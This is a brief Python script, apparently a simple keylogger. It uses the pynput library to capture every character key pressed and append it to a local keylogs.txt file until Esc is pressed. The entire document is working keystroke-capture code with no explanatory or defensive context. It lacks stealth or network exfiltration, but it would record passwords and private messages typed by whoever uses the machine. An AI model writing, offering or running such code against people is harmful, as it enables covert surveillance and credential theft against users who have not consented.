import os
import sys
from pynput import keyboard

def on_press(key):
    try:
        print("Key {} pressed".format(key.char), file=open(os.path.join(os.path.dirname(__file__), "keylogs.txt"), "a"))
    except AttributeError:
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
